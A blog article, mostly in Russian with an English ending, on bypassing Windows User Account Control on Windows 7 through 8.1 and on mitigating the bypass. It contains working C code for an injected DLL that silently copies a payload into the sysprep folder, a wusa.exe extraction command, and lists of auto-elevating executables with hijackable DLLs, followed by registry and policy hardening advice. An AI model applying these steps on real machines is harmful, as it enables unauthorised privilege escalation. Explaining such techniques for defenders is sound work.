---
title: Обход контроля учетных записей (UAC) в Windows и методы смягчения
layout: post
categories: articles
tags:
  - articles_rus
  - windows
published: true
---

# Оглавление
{:.no_toc}

* toc
{:toc}


# Введение

Защита компьютеров от злоупотреблений в корпоративной среде всегда была непрерывным процессом. Предоставление прав администратора пользователям всегда злоупотреблялось и пользователи устанавливали неутвержденное программное обеспечение, изменяли конфигурации и тд. Не предоставляй права локального администратора и они утверждают, что не могут выполнять свою работу. Если малварь скомпрометировала машину с полными правами администратора, то вы, скорее всего, попытаетесь переоборудовать ее.

Контроль учетных записей (UAC) дает нам возможность работать со стандартными правами пользователя вместо полных прав администратора. Таким образом, даже если ваша стандартная учетная запись находится в группе локальных администраторов, ущерб ограничен. То есть установка служб, драйверов, запись в безопасные места и тд запрещены. Для выполнения этих действий пользователям потребуется взаимодействовать с рабочим столом, например, щелкнув правой кнопкой мыши и запустив их с правами администратора, или принять запрос на повышение прав от UAC. UAC был представлен начиная с Windows Vista и содержит ряд технологий включая виртуализацию файловой системы и реестра, учетную запись защищенного администратора (PA или Protected Administrator), запросы на повышение прав UAC и уровни целостности Windows.

UAC работает регулируя уровень разрешений нашей учетной записи, поэтому действия программ выполняются из под обычного пользователя, даже если у нас есть права локального администратора на компьютере. Когда будут внесены изменения требующие разрешения на уровне администратора, UAC уведомит нас. Если у нас есть права локального администратора, мы можем нажать «Да», чтобы продолжить, в противном случае нам будет предложено ввести пароль администратора. Однако это будет зависеть от того, какие политики были определены в вашей среде.

В этой статье показано, как легко можно обойти запросы на повышение прав UAC и какие действия можно предпринять для уменьшения этой угрозы.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/regedituac.png){:class="imghalf"}

# Обход UAC

Эксплуатация UAC является тривиальным процессом. Есть два этапа которые необходимо пройти для достижения обхода, чтобы подняться от стандартных прав пользователя до прав администратора. Эти шаги широко опубликованы, так что в этом нет ничего нового, хотя на этапе 2 документированы еще некоторые уязвимости связанные с захватом (hijacking) DLL.


   >Запить в безопасное место
    Эксплуатация DLL hijacking уязвимости

Для того чтобы наш обход был успешным, мы должны начать с:

   >Процесс средней целостности
    Стандартный пользователь в группе администраторов
    Исполняемый файл Windows который должен быть подписан сертификатом подписи кода Microsoft
    Исполняемый файл Windows должен находиться в безопасном каталоге
    Исполняемый файл Windows также должен указывать свойство автоматического поднятия прав (Elevate) в своем манифесте.

# Запись в безопасное место
Есть несколько способов, которыми мы можем записать в безопасное место.

   >Использовать IFileOperation COM Object
    Использование автономного установщика Центра обновления Windows (Windows Update Standalone Installer/wusa.exe)

# IFileOperation COM Object

COM Object в IFileOperation имеет метод, который мы можем использовать для копирования файлов в наше безопасное место, так как операция автоматически поднимется в правах и сможет сделать копию привилегий. Для использования мы можем внедрить нашу вредоносную DLL в процесс средней целостности для выполнения операции. Поскольку для COM-объекта установлено автоматическое повышение уровня, внедренный процесс не нужно отмечать для автоматического повышения в своем манифесте.

В Windows 7 внедрены процессы которые успешно скопированы, это:

~~~
C:\Windows\explorer.exe
C:\Windows\System32\wuauclt.exe
C:\Windows\System32\taskhost.exe
~~~

Во время тестов taskhost.exe срабатывает только один раз после загрузки, и wuauclt.exe не всегда работает, что оставляет explorer.exe только надежным процессом.

On Windows 8 внедрены процессы которые успешно скопированы, это:

~~~
C:\Windows\explorer.exe
C:\Windows\System32\wuauclt.exe
C:\Windows\System32\RuntimeBroker.exe
~~~

И снова только explorer.exe надежный процесс, и единственный который работал в Windows 8.1

Основная часть кода ниже взята из MSDN с некоторыми незначительными изменениями. Используемые значения SetOperationFlags были взяты из опубликованного кода обхода UAC [здесь](https://download.pureftpd.org/pub/misc/UAC.cpp).

~~~
#include <stdio.h>
#include <Shobjidl.h>
#include <Windows.h>

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "shell32.lib")

int WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
FileOperation  *pfo;
IShellItem      *psiFrom = NULL;
IShellItem      *psiTo = NULL;
LPCWSTR pszSrcItem = L"calc.dll";
LPCWSTR pszNewName = L"cryptbase.dll";
LPCWSTR pszDest    = L"C:\\windows\\System32\\sysprep";

HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
if (SUCCEEDED(hr))
{
 hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pfo));
 if (SUCCEEDED(hr))
 {
 hr = pfo->SetOperationFlags( FOF_NOCONFIRMATION |
 FOF_SILENT |
 FOFX_SHOWELEVATIONPROMPT |
 FOFX_NOCOPYHOOKS |
 FOFX_REQUIREELEVATION |
 FOF_NOERRORUI );
 if (SUCCEEDED(hr))
 {
 hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&psiFrom));
 if (SUCCEEDED(hr))
 {
 if (NULL != pszDest)
 {
 hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&psiTo));
 }
 if (SUCCEEDED(hr))
 {
 hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);
 if (NULL != psiTo)
 {
 psiTo->Release();
 }
 }
 psiFrom->Release();
 }
 if (SUCCEEDED(hr))
 {
 hr = pfo->PerformOperations();
 }
 }
 pfo->Release();
 }
 CoUninitialize();
 }
 return 0;
}
~~~

# Windows Update Standalone Installer
Другой способ копирования в наше безопасное место, это использовать Windows Update Standalone Installer (wusa.exe). Wusa.exe запускается как процесс высокой целостности тк. настроен на авто-подъём прав в своем манифесте. Для автоматического повышения прав, исполняемый Windows файл должен быть подписан, находится в безопасном каталоге, таком как C:\\Windows\\System32, и должен с правильно прописанным свойством autoElevate в своем манифесте.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/wusaautoelevate.png){:class="imghalf"}

Мы используем wusa.exe для распаковки CAB файл (cabinet archive file или файл кабинетного архива) в наше безопасное место

	wusa c:\users\user1\desktop\poc.tmp /extract:c:\windows\system32\sysprep
    
# Эксплуатация уязвимости DLL hijacking
При эксплуатации уязвимости перехвата DLL, исполняемый файл который мы собираемся запустить снова должен быть подписан; находится в безопасном каталоге; и должен указывать свойство autoElevate в своем манифесте для загрузки в качестве процесса с высокой степенью целостности.

В Windows 7 есть три исполняемых файла которые можно эксплуатировать и связанные с ними библиотеки DLL перечисленны ниже:
~~~
C:\windows\ehome\Mcx2Prov.exe
C:\Windows\ehome\CRYPTBASE.dll

C:\windows\System32\sysprep\sysprep.exe
C:\Windows\System32\sysprep\CRYPTSP.dll
C:\windows\System32\sysprep\CRYPTBASE.dll
C:\Windows\System32\sysprep\RpcRtRemote.dll
C:\Windows\System32\sysprep\UxTheme.dll

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL
~~~

На malwr.com вредоносная программа выложенная 25 Июня прошлого года, уже использовала Mcx2Prov.exe для обхода UAC, а днем позже эксплойт был [опубликован](https://github.com/hzeroo/Carberp/blob/master/source%20-%20absource/pro/all%20source/BJWJ/source/exploit/UAC_bypass.cpp).

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/malwruac.png){:class="imghalf"}

Тот же хэш был также отмечен на VirusTotal (38/54), был представлен более четырех месяцев назад.

В Windows 8 также есть три исполняемых файла которые можно эксплуатировать и связанные с ними библиотеки DLL перечислены ниже:

~~~
C:\windows\System32\sysprep\sysprep.exe
C:\windows\System32\sysprep\CRYPTBASE.dll
C:\Windows\System32\Sysprep\dwmapi.dll
C:\Windows\System32\Sysprep\SHCORE.dll

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL

C:\windows\System32\pwcreator.exe
C:\Windows\System32\vds.exe
C:\Windows\System32\UReFS.DLL
~~~

Наконец, в Windows 8.1 есть также три исполняемых файла которые можно эксплуатировать и связанные с ними библиотеки DLL перечисленны ниже:

~~~
C:\windows\System32\sysprep\sysprep.exe
C:\Windows\System32\Sysprep\SHCORE.dll
C:\Windows\System32\Sysprep\OLEACC.DLL

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL

C:\windows\System32\pwcreator.exe
C:\Windows\System32\vds.exe
C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll
C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll
C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll
C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll
C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll
~~~

Вызов исполняемого файла pwcreator.exe (создание рабочей области Windows To Go) вызывает vds.exe (служба виртуальных дисков), которая затем загружает нашу DLL и даёт нам целостность системы работает из под SYSTEM аккаунта.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/proexpvds.png){:class="imghalf"}

Вызов этих исполняемых файлов sysprep.exe, cliconfg.exe и pwcreater.exe приводит к появлению окна с графическим интерфейсом, но так же должен легко запуститься в фоновом режиме, а затем завершиться после эксплуатации. Это то что я не изучал слишком глубоко, поэтому тут я вас оставлю в неведении.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/sysprep.png){:class="imghalf"}
![1]({{ site.baseurl }}/assets/img/posts/bypass uac/cliconfg.png){:class="imghalf"}
![1]({{ site.baseurl }}/assets/img/posts/bypass uac/pwcreator.png){:class="imghalf"}

# Смягчение
Лучший способ смягчить этот обход - просто не предоставлять пользователям права локального администратора для своих компьютеров. Большинство учетных записей пользователей в корпоративной среде и вы должны быть в состоянии сделать это, уменьшая поверхность атаки. Это, однако, не распространяется на домашних пользователей, которые по умолчанию имеют права локального администратора.

Фактически, обход работает только при двух средних выставленных настройках UAC, которые позволяют автоматически подниматься. Чтобы увидеть настройки вам нужно перейти в Панель управления - Учетные записи пользователей - Изменить настройки контроля учетных записей.

>Уведомлять меня только когда приложения пытаются внести изменения в мой компьютер (по умолчанию)

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/uacsettings.png){:class="imghalf"}

Таким образом, мы могли бы установить "Всегда уведомлять", но это вернуло бы его к тому, как это было в Windows Vista с постоянными уведомлениями и не очень практично, так же пользователь в конечном итоге установит его на "Никогда не уведомлять", что определенно не является хорошей идеей.

Microsoft предоставила нам 10 политик UAC с которыми стоит поиграть, поэтому стоит потратить некоторое время на их понимание и тестирование прежде чем внедрять их в среде своего домена. Чтобы увидеть, что применено на вашем локальном компьютере, введите secpol.msc в Start-Run, чтобы открыть  окно «Локальная политика безопасности» и развернуть папку «Параметры локальной политики безопасности». Запустите rsop.msc для просмотра групповых политик, применяемых на компьютерах в доменной среде.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/secpol.png){:class="imghalf"}

Вот так выглядят в реестре значения UAC по умолчанию

~~~
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
"ConsentPromptBehaviorAdmin"=dword:00000005
"ConsentPromptBehaviorUser"=dword:00000003
"EnableInstallerDetection"=dword:00000001
"EnableLUA"=dword:00000001
"EnableSecureUIAPaths"=dword:00000001
"EnableUIADesktopToggle"=dword:00000000
"EnableVirtualization"=dword:00000001
"FilterAdministratorToken"=dword:00000000
"PromptOnSecureDesktop"=dword:00000001
"ValidateAdminCodeSignatures"=dword:00000000
~~~

Когда ползунок перемещается вверх до «Всегда уведомлять меня», он меняет это значение.
~~~
"ConsentPromptBehaviorAdmin"=dword:00000002
~~~

Когда ползунок перемещается вниз до «Уведомлять меня только когда приложения пытаются внести изменения в мой компьютер (не изменяя настройки рабочего стола)», он меняет это значение.

	"PromptOnSecureDesktop"=dword:00000000

Ну и когда ползунок перемещается в «Никогда не уведомлять», измененные значения это


~~~
"ConsentPromptBehaviorAdmin"=dword:00000000
"EnableLUA"=dword:00000000
"PromptOnSecureDesktop"=dword:00000000
~~~

Обратите внимание, что EnableLUA полностью отключен. Это чрезвычайно опасное значение, и его никогда не следует отключать, поэтому настоятельно рекомендуется включить эти параметры в групповых политиках чтобы они всегда применялись, если параметры сбрасываются/изменяются пользователями или ранее удаленными вредоносными программами.


# User Account Control: Run all administrators in Admin Approval Mode

Once disabled not only a malicious process could be able to go straight to high integrity without any bypass but also Internet Explorer would run in medium integrity. UAC gives us the Protected Mode (sandbox) in Internet Explorer providing added security. Internet Explorer normally runs in low integrity child process so if compromised by some IE exploit the damage is minimized as in low integrity there are only a handful of locations it can be written to on the system.

These changes mentioned above have been seen on Windows 7. On Windows 8/8.1 EnableLUA does not change to disabled. So when the slider is moved to Never notify the values changed are only

~~~
"ConsentPromptBehaviorAdmin"=dword:00000000
"PromptOnSecureDesktop"=dword:00000000
~~~

Since value “EnableLUA”=dword:00000001 does not change, UAC is not completely disabled and Internet Explorer would still run in low integrity.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/iew8low.png){:class="imghalf"}

If however a user logged onto a machine using the local admin account (administrator or whatever renamed on your corporate build) UAC settings does not apply as all processes run in high integrity. This applies to Windows 7/8 and 8.1 so always make sure users DO NOT logon using local admin account, if local admin rights are required better add their domain account to the local administrators group.

![1]({{ site.baseurl }}/assets/img/posts/bypass uac/compmanuac.png){:class="imghalf"}
![1]({{ site.baseurl }}/assets/img/posts/bypass uac/iew8high.png){:class="imghalf"}

If for whatever reason logging on using the local admin account is a necessity then best set this UAC policy to enabled.

User Account Control: Admin Approval Mode for the built-in Administrator account
“FilterAdministratorToken”=dword:00000001

Another option would be to look into renaming or deleting the executables Mcx2Prov.exe, sysprep.exe, cliconfg.exe and pwcreator.exe if definitely not required on the system so the second stage to exploit DLL hijacking fails.

Finally if users do require local admin privileges then worth setting their machine UAC policy to Always notify and they live with the constant notifications.

User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode (2-Prompt for consent on the secure desktop)

# Conclusion
This bypass only works when all of the requirements are available to abuse. Remove one requirement and the bypass will fail. Office documents are opened in medium integrity so these are ideal targets to abuse the UAC bypass. Since these bypasses are so effortlessly achieved the only real course of action would be to set UAC to “Always notify” or remove local admin rights for the user. In the end using agents like Microsoft EMET or MalwareBytes Anti-Exploit would be the best mitigating action to take from initially being exploited in the first place.


# References
http://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx
http://technet.microsoft.com/en-us/magazine/2007.06.uac.aspx
http://windows.microsoft.com/en-gb/windows/what-is-user-account-control#1TC=windows-7
http://windows.microsoft.com/en-gb/windows/what-are-user-account-control-settings#1TC=windows-7
http://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know
